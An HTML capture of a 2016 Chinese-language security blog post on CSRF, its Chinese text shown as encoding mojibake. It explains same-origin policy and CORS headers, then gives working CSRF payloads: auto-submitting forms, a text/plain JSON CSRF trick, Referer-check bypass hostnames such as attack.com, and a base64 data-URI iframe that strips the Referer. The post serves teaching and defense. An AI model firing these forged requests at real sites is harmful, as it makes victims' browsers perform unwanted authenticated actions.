<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>CSRF | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="åŒæºç­–ç•¥åŒæºç­–ç•¥(Same Origin policy, SOP)ï¼Œä¹Ÿç§°ä¸ºå•æºç­–ç•¥(Single Origin policy)ï¼Œç”¨äºWebæµè§ˆå™¨ç¼–ç¨‹è¯­è¨€çš„å®‰å…¨æªæ–½ï¼Œç”¨ä»¥ä¿æŠ¤ä¿¡æ¯çš„ä¿å¯†æ€§å’Œå®‰å…¨æ€§ã€‚åŒæºç­–ç•¥é˜²æ­¢ç½‘ç«™è„šæœ¬è®¿é—®å…¶ä»–ç«™ç‚¹ä½¿ç”¨è„šæœ¬ï¼Œä¹Ÿç»„ç»‡å®ƒä¸å…¶ä»–ç«™ç‚¹äº¤äº’ã€‚åªè¦åè®®ã€ç«¯å£ã€ä¸»æœºä¸‰ä¸ªæœ‰ä¸€ä¸ªä¸åŒ¹é…ï¼Œå°±æ˜¯è·¨åŸŸè¯·æ±‚ã€‚
å¦‚æœè¦è·¨åŸŸè¯·æ±‚ï¼Œæœ‰ä¸‹é¢çš„é™åˆ¶ï¼š

ä»…å…è®¸GETã€HEADã€POSTè¯·æ±‚
ä»…å…è®¸æ‰‹åŠ¨è®¾ç½®Acceptã€Accept-Languageã€Content-Languageå’ŒContent-Typeå¤´
Content-Typeå¤´ä»…å…è®¸ä½¿ç”¨application/x-www-form-urlencoded,multipart/form-dataå’Œtext/plainè¿™ä¸‰ç§å€¼ã€‚

æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªè¯·æ±‚çš„ï¼Œç§°ä¸ºsimple requestå½“ä¸Šé—¨çš„simple requestä¸èƒ½æ»¡è¶³ä½¿ç”¨åœºæ™¯çš„æ—¶å€™ï¼Œæœ‰ä»¥ä¸‹çš„è¯·æ±‚è§£å†³è·¨åŸŸé™åˆ¶ï¼Œéƒ½æ˜¯ä»¥Access-Control-å¼€å¤´ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼š

Access-Control-Allow-Originï¼šé™åˆ¶è¿™ä¸ªè¯·æ±‚èƒ½ä»å“ªäº›URIè®¿é—®ã€‚


åœ¨ä½¿ç”¨è¿™ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨AJAXæ—¶ï¼Œè¢«è°ƒç”¨æ–¹éœ€è¦è¾“å‡ºè¿™ä¸ªå¤´ï¼ŒæŒ‡åå¯ä»¥ä»å“ªä¸ªç½‘ç«™ è®¿é—®ï¼Œå¦‚æœæœªè¾“å‡ºè¿™ä¸ªå¤´ï¼Œåªå…è®¸åŒåŸŸåçš„è®¿é—®ã€‚


Access-Control-Allow-Credentials: å…è®¸è¿™ä¸ªè¯·æ±‚ä½¿ç”¨cookieã€‚


ä¸€èˆ¬è·¨åŸŸæƒ…å†µä¸‹ï¼ŒAJAXä¸ä¼šé™„å¸¦ç”¨æˆ·çš„Cookieï¼Œä¹Ÿä¸å…è®¸è®¾ç½®ç”¨æˆ·çš„Cookieï¼Œè¦ä½¿ç”¨è¿™ä¸ªçš„è¯ï¼Œé¦–å…ˆCåœ¨æ„é€ è¿™ä¸ªXMLHTTPRequestå¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®withCredentialså±æ€§ã€‚

XMLHttpRequest:

var xhr &amp;#x3D; new XMLHttpRequest();
xhr.open(&amp;#39;GET&amp;#39;, url, true);
xhr.withCredentials &amp;#x3D; true;
xhr.onreadystatechange &amp;#x3D; handler;
xhr.send()"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="CSRF"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> CSRF</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><p>åŒæºç­–ç•¥(Same Origin policy, SOP)ï¼Œä¹Ÿç§°ä¸ºå•æºç­–ç•¥(Single Origin policy)ï¼Œç”¨äºWebæµè§ˆå™¨ç¼–ç¨‹è¯­è¨€çš„å®‰å…¨æªæ–½ï¼Œç”¨ä»¥ä¿æŠ¤ä¿¡æ¯çš„ä¿å¯†æ€§å’Œå®‰å…¨æ€§ã€‚åŒæºç­–ç•¥é˜²æ­¢ç½‘ç«™è„šæœ¬è®¿é—®å…¶ä»–ç«™ç‚¹ä½¿ç”¨è„šæœ¬ï¼Œä¹Ÿç»„ç»‡å®ƒä¸å…¶ä»–ç«™ç‚¹äº¤äº’ã€‚<br>åªè¦<strong>åè®®</strong>ã€<strong>ç«¯å£</strong>ã€<strong>ä¸»æœº</strong>ä¸‰ä¸ªæœ‰ä¸€ä¸ªä¸åŒ¹é…ï¼Œå°±æ˜¯è·¨åŸŸè¯·æ±‚ã€‚</p>
<p>å¦‚æœè¦è·¨åŸŸè¯·æ±‚ï¼Œæœ‰ä¸‹é¢çš„é™åˆ¶ï¼š</p>
<ul>
<li>ä»…å…è®¸GETã€HEADã€POSTè¯·æ±‚</li>
<li>ä»…å…è®¸æ‰‹åŠ¨è®¾ç½®Acceptã€Accept-Languageã€Content-Languageå’ŒContent-Typeå¤´</li>
<li>Content-Typeå¤´ä»…å…è®¸ä½¿ç”¨application/x-www-form-urlencoded,multipart/form-dataå’Œtext/plainè¿™ä¸‰ç§å€¼ã€‚</li>
</ul>
<p>æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªè¯·æ±‚çš„ï¼Œç§°ä¸ºsimple request<br>å½“ä¸Šé—¨çš„simple requestä¸èƒ½æ»¡è¶³ä½¿ç”¨åœºæ™¯çš„æ—¶å€™ï¼Œæœ‰ä»¥ä¸‹çš„è¯·æ±‚è§£å†³è·¨åŸŸé™åˆ¶ï¼Œéƒ½æ˜¯ä»¥<code>Access-Control-</code>å¼€å¤´ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼š</p>
<ul>
<li>Access-Control-Allow-Originï¼šé™åˆ¶è¿™ä¸ªè¯·æ±‚èƒ½ä»å“ªäº›URIè®¿é—®ã€‚</li>
</ul>
<blockquote>
<p>åœ¨ä½¿ç”¨è¿™ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨AJAXæ—¶ï¼Œè¢«è°ƒç”¨æ–¹éœ€è¦è¾“å‡ºè¿™ä¸ªå¤´ï¼ŒæŒ‡åå¯ä»¥ä»å“ªä¸ªç½‘ç«™ è®¿é—®ï¼Œå¦‚æœæœªè¾“å‡ºè¿™ä¸ªå¤´ï¼Œåªå…è®¸åŒåŸŸåçš„è®¿é—®ã€‚</p>
</blockquote>
<ul>
<li>Access-Control-Allow-Credentials: å…è®¸è¿™ä¸ªè¯·æ±‚ä½¿ç”¨cookieã€‚</li>
</ul>
<blockquote>
<p>ä¸€èˆ¬è·¨åŸŸæƒ…å†µä¸‹ï¼ŒAJAXä¸ä¼šé™„å¸¦ç”¨æˆ·çš„Cookieï¼Œä¹Ÿä¸å…è®¸è®¾ç½®ç”¨æˆ·çš„Cookieï¼Œè¦ä½¿ç”¨è¿™ä¸ªçš„è¯ï¼Œé¦–å…ˆCåœ¨æ„é€ è¿™ä¸ªXMLHTTPRequestå¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®withCredentialså±æ€§ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:

var xhr &#x3D; new XMLHttpRequest();
xhr.open(&#39;GET&#39;, url, true);
xhr.withCredentials &#x3D; true;
xhr.onreadystatechange &#x3D; handler;
xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">JQuery:

$.ajax(&#123;
	&#39;url&#39;: url,
	&#39;type&#39;: &#39;GET&#39;,
	&#39;xhrFields&#39;: &#123;&#39;withCredentials&#39;: true&#125;,
	&#39;success&#39;: handler
	&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>Access-Control-Request-Method å’Œ Access-Control-Allow-Methodså£°æ˜æ‰€å…è®¸çš„HTTP methodsï¼Œæ™®é€šçš„è·¨åŸŸè¯·æ±‚åªæ”¯æŒGETã€HEADå’ŒPOSTæ–¹æ³•ï¼Œæƒ³ç”¨å…¶ä»–æ–¹æ³•çš„è¯éœ€è¦å°†<code>Access-Control-Request-Method</code>è®¾ç½®ä¸ºDELETEç­‰å…¶ä»–æ–¹æ³•ï¼Œåˆ™è¿”å›çš„<code>Access-Control-Allow-Methods</code>ä¸­è¿”å›æ‰€æœ‰æ”¯æŒçš„æ–¹æ³•</li>
</ul>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>ä¸¤ç§ç±»å‹ï¼šGET POST</p>
<p>GET:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;http:&#x2F;&#x2F;wooyun.org&#x2F;delete&#x2F;id &#x2F;&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>POST:åˆ©ç”¨è‡ªåŠ¨æäº¤è¡¨å•</p>
<pre class="line-numbers language-none"><code class="language-none">
&lt;form action&#x3D;http:&#x2F;&#x2F;wooyun.org&#x2F;add  method&#x3D;POST&gt;

&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot;&gt;

&lt;&#x2F;form&gt;

&lt;script&gt; document.forms[0].submit();&lt;&#x2F;script&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¸¸è§é˜²å¾¡æœ‰ä¸¤ç§ï¼šæ£€æŸ¥Refererå’Œä½¿ç”¨tokenï¼Œå¦‚æœåŒåŸŸä¸‹å­˜åœ¨xssï¼Œé™¤äº†éªŒè¯ç ï¼Œå…¶ä»–éƒ½æ— æ³•é˜²å¾¡è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>ç¨‹åºåç«¯å¯èƒ½ä½¿ç”¨REQUESTæ–¹å¼æ¥å—ï¼Œä½†æ˜¯ç¨‹åºé»˜è®¤ä½¿ç”¨POSTï¼Œæ‰€ä»¥æ”¹ä¸ºGETè¯·æ±‚ä¹Ÿå¯ä»¥ã€‚</p>
<p>å½“é‡‡ç”¨Referé˜²å¾¡çš„æ—¶å€™ï¼Œå¯ä»¥æŠŠè¯·æ±‚ä¸­çš„è¿™ä¸ªå­—æ®µä¿®æ”¹å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">
åŸå§‹Referï¼š http:&#x2F;&#x2F;test.com&#x2F;index.php

ç»•è¿‡ä¹‹åï¼š

http:&#x2F;&#x2F;test.com.attack.com&#x2F;index.php

http:&#x2F;&#x2F;attack.com&#x2F;test.com&#x2F;index.php

[ç©º]
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>CSRFæ”»å‡»ä¼šæ ¹æ®ä¸åŒåœºæ™¯ï¼Œå¤§åˆ°å‚ç›´è¶Šæƒï¼Œè¿™äº›åœºæ™¯çš„æ”»å‡»éƒ½æ˜¯<strong>è·¨åŸŸè¯·æ±‚</strong>ï¼Œå¹¶ä¸”æ¯”è¾ƒé‡è¦çš„éƒ½æ˜¯åœ¨å—å®³è€…èº«ä»½å¾—åˆ°è®¤è¯çš„ä»¥åå‘ç”Ÿçš„ã€‚</p>
<h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><p>GETå‹çš„<code>CSRF</code>ï¼ˆå¸¦srcå±æ€§çš„HTMLæ ‡ç­¾éƒ½å¯ä»¥è·¨åŸŸå‘èµ·GETè¯·æ±‚ï¼‰:</p>
<pre class="line-numbers language-none"><code class="language-none">
&lt;link href&#x3D;&quot;â€¦&quot;&gt;

&lt;img src&#x3D;&quot;â€¦&quot;&gt;

&lt;iframe src&#x3D;&quot;â€¦&quot;&gt;

&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0; url&#x3D;â€¦&quot;&gt;

&lt;script src&#x3D;&quot;â€¦&quot;&gt;

&lt;video src&#x3D;&quot;â€¦&quot;&gt;

&lt;audio src&#x3D;&quot;â€¦&quot;&gt;

&lt;a href&#x3D;&quot;â€¦&quot;&gt;

&lt;table background&#x3D;&quot;â€¦&quot;&gt;

â€¦
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>POSTè¯·æ±‚ï¼Œåˆ™å¿…é¡»ä½¿ç”¨è¡¨å•æäº¤çš„æ–¹å¼ï¼Œè¿™äº›æ ‡ç­¾å¯ä»¥ä½¿ç”¨JavaScriptåŠ¨æ€ç”Ÿæˆï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">
&lt;script&gt;

    new Image().src&#x3D;&#39;http:&#x2F;&#x2F;wooyun.org&#x2F;csrf&#39;;

&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>###POSTç±»å‹çš„CSRF</p>
<ul>
<li>fomsâ€™ method is limited to GET and POST</li>
<li>formâ€™s POST message is limited to the three formats <ul>
<li>application/x-www-form-urlencode</li>
<li>multipart/form-data</li>
<li>text/plain</li>
</ul>
</li>
<li>with the form data encodeing text/plain it is still possible to forge requests containg valid json data.</li>
</ul>
<blockquote>
<p>The POST body of an HTML formâ€™s request is always either <code>application/x-www-form-urlencoded</code>,<code>multipart/form-data</code>, or <code>text-plain</code>ã€‚</p>
</blockquote>
<p>ç°åœ¨è€ƒè™‘ä¸‹æœ‰ä¸€ä¸ªå¯¹äºpostè¯·æ±‚ï¼Œå…¶ä¸­bodyæ˜¯jsonæ ¼å¼ï¼ŒæœåŠ¡ç«¯æ ¡éªŒ<code>Content-Type: application/json</code>å­—æ®µ</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;member&#x2F;shop&#x2F;query HTTP&#x2F;1.1
Host: example.com
Content-Length: 147
Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;52.0.2743.116 Safari&#x2F;537.36
Content-Type: application&#x2F;json; charset&#x3D;UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q&#x3D;0.8
Connection: close

&#123;&quot;bussid&quot;: 110&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯¹äºä¸Šé¢è¿™ä¸ªè¯·æ±‚æ¥è¯´ï¼Œå‡è®¾ä»–å­˜åœ¨csrfï¼Œé‚£ä¹ˆhtmlæ€ä¹ˆå†™ï¼Ÿ</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt;
	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&#39;&#123;&quot;bussid&quot;: 1&#125;&#39; &#x2F;&gt;
&lt;&#x2F;form&gt;
&lt;script&gt;
	document.forms[0].submit();
&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æŠ“åŒ…ä¹‹åå¯ä»¥å‘ç°ï¼Œ<code>POST</code>çš„bodyæ•°æ®åŒ…æ˜¯è¿™æ ·çš„ï¼š<code>&#123;&quot;bussid&quot;: 1&#125;=</code>ï¼Œæ²¡çœ‹é”™ï¼Œåé¢å¤šäº†ä¸€ä¸ªç­‰å·ã€‚ä¸ºæ¯›ä¼šè¿™æ ·å­ï¼Œå› ä¸ºæ˜¯è¿™æ ·çš„ï¼š</p>
<blockquote>
<p>itâ€™s simply the stand delimiter placed in POST request between parameters, which would usually look like this:<br><code>test=x&amp;more=bar</code></p>
</blockquote>
<p>è‚¿ä¹ˆç»•è¿‡å»ï¼š</p>
<blockquote>
<p>an intersting way of getting around this is that <em>some</em> JSON parser accept C stype comments, so you could expand your payload to end in a double slash, effectively commenting out tie equals sign and creating this:<br><code>&#123;&quot;bussid&quot;: 1&#125;//=</code></p>
</blockquote>
<p>BUTï¼š</p>
<blockquote>
<p>â€œJSON does not have comments, A JSON encoder MUST NOT output comments, A JSON decodert MAY accept and ignore comments.â€</p>
</blockquote>
<p>è§£å†³æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼Œè·Ÿsqlæ³¨å…¥æˆ–è€…xsså·®ä¸å¤šï¼Œè¦æŠŠåé¢çš„<code>=</code>å·è¡¥å…¨ï¼Œæœ€åå°±æ˜¯å¸Œæœ›è¿™ä¸ªå¡«å……ä¸ä¼šå½±å“åˆ°è¯·æ±‚ã€‚å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;example.com&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt;
       	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&#39;&#123;&quot;bussid&quot;: 1,&quot;ignore_me&quot;:&quot;&#39;value&#x3D;&#39;test&quot;&#125;&#39; &#x2F;&gt;
&lt;&#x2F;form&gt;
&lt;script&gt;
       	document.forms[0].submit();
&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¤šå‡ºæ¥çš„é‚£ä¸€æ®µæ˜¯ä¸ºäº†é—­åˆä¸Šé¢çš„é‚£ä¸ª<code>=</code>ï¼Œå¯¹äºè¿™ä¸ªè¯·æ±‚ï¼Œå…¶ä¸­çš„bodyæ˜¯è¿™ä¸ªï¼š<br><code>&#123;&quot;bussid&quot;: 1,&quot;ignore_me&quot;:&quot;=test&quot;&#125;</code></p>
<p>åªèƒ½å¸Œæœ›æœåŠ¡å™¨ä¼šä¸¢å¼ƒæ‰å¤šä½™çš„JSONï¼Œå¹¶ä¸”è¿™ç§è¯·æ±‚æ˜¯<code>text/plain</code>æ ¼å¼ã€‚</p>
<p>é‚£ä¹ˆæœ€åçš„é—®é¢˜æ¥äº†ï¼š</p>
<pre><code>All that we need to perform a JSON CSRF attack is to 
submit a valid JSON request using html or a client side 
code. So, Why cannot we use XMLHTTPRequest object to 
create a valid JSON request?
</code></pre>
<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;ajax.cdnjs.com&#x2F;ajax&#x2F;libs&#x2F;json2&#x2F;20110223&#x2F;json2.js&quot;&gt;&lt;&#x2F;script&gt;
if (window.XMLHTTPReuquest)&#123;
var xmlhttp&#x3D;new XMLHttpRequest();
&#125;
else&#123;
var xmlhttp&#x3D;new ActiveXObject(&#39;Microsoft.XMLHTTP&quot;);
&#125;
xmlhttp.open(&quot;POST&quot;, &quot;http:&#x2F;&#x2F;sample.com&quot;, true);
xmlhttp.withCredentials&#x3D;&quot;true&quot;;
xmlhttp.setRequestHeader(&quot;Content-Type&quot;, &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;);
xmlhttp.send(JSON.stringify(&#123;&quot;buddis&quot;: 1&#125;));
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸ªä¸Šé¢çš„ä»£ç æ˜¯ä¸ä¼šæˆåŠŸçš„ï¼Œå› ä¸ºå½“è·¨åŸŸè®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘è¿™ä¸ªåœ°å€å‘èµ·ä¸€ä¸ªOPTIONè¯·æ±‚ï¼Œè¯¢é—®æ˜¯å¦å¯ç”¨ï¼Œç„¶åå†å‘èµ·å®é™…çš„è¯·æ±‚ã€‚ä¼šç”¨åˆ°ä»¥ä¸‹çš„headerï¼š</p>
<ul>
<li><p>Access-Control-Request-Method å’Œ Access-Control-Allow-Methodsï¼šå£°æ˜æ‰€å…è®¸åŠä½¿ç”¨çš„HTTP methodsï¼Œæ™®é€šè·¨åŸŸè¯·æ±‚åªæ”¯æŒGETã€HEADã€POSTæ–¹æ³•ï¼Œæƒ³ç”¨å…¶ä»–æ–¹æ³•çš„è¯ï¼Œè®¿é—®éœ€è¦å°†<code>Access-Control-Request-Method</code>è®¾ç½®ä¸ºDELETEç­‰å…¶ä»–æ–¹æ³•ï¼Œç„¶åè¢«è¯·æ±‚çš„ç½‘ç«™åœ¨Access-Control-Allow-Methodsä¸­è¿”å›æ‰€æœ‰æ”¯æŒçš„æ–¹æ³•ï¼ˆç”¨é€—å·éš”å¼€ï¼‰å³å¯ã€‚</p>
</li>
<li><p>Access-Control-Request-Headers å’Œ Access-Control-Allow-Headersï¼šå£°æ˜æ‰€ç”¨åŠå…è®¸çš„çš„HTTP headersï¼Œç±»ä¼¼ä¸Šä¸€ç»„ï¼Œç”¨äºæ”¯æŒå…¶ä»–è¯·æ±‚å¤´ã€‚</p>
</li>
<li><p>Access-Control-Max-Age: å‘Šè¯‰æµè§ˆå™¨å¤šé•¿æ—¶é—´å†…ä¸è¦å‘é€ç›¸åŒçš„Preflighted requestï¼Œç›´æ¥ä½¿ç”¨ç¼“å­˜çš„ç»“æœã€‚</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.keakon.net/2015/12/06/%E4%B8%8E%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84HTTP%E5%A4%B4">https://www.keakon.net/2015/12/06/%E4%B8%8E%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84HTTP%E5%A4%B4</a></p>
<p><a target="_blank" rel="noopener" href="https://itsecurityconcepts.com/2014/04/22/csrf-on-json-requests/">https://itsecurityconcepts.com/2014/04/22/csrf-on-json-requests/</a></p>
<h2 id="é¥¶è¿‡"><a href="#é¥¶è¿‡" class="headerlink" title="é¥¶è¿‡"></a>é¥¶è¿‡</h2><p>å¦‚æœé˜²å¾¡CSRFçš„ç­–ç•¥æ˜¯è¿™æ ·çš„ï¼š</p>
<p>éªŒè¯Originæˆ–è€…Refererï¼Œå¦‚æœRefereræ˜¯ç©ºï¼Œè¯·æ±‚æ”¾è¡Œã€‚è¿™ç§é˜²å¾¡æœ‰ä¸ªç¼ºé™·ï¼š</p>
<p>ä½¿ç”¨iframeçš„dataåè®®æˆ–è€…httpså‘èµ·çš„è¯·æ±‚æ˜¯æ²¡æœ‰Refererçš„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
    &lt;body&gt;
       &lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg&#x3D;&#x3D;&quot;&gt;
    &lt;&#x2F;body&gt; 
&lt;&#x2F;html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<ul>
<li><a target="_blank" rel="noopener" href="http://0x007.blog.51cto.com/6330498/1610946">http://0x007.blog.51cto.com/6330498/1610946</a></li>
</ul>

	</div>

	
	<span id="/2016/08/29/csrf.html" class="leancloud-visitors view" data-flag-title="CSRF">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2016/09/25/whitehat-talk-web-security.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2016/07/26/python-cpickle-shell.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2016-08-29 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Learning/">Learning<span>16</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-article-text">åŒæºç­–ç•¥</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CSRF"><span class="toc-article-text">CSRF</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-article-text">æ”»å‡»æ–¹å¼</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%A5%B6%E8%BF%87"><span class="toc-article-text">é¥¶è¿‡</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
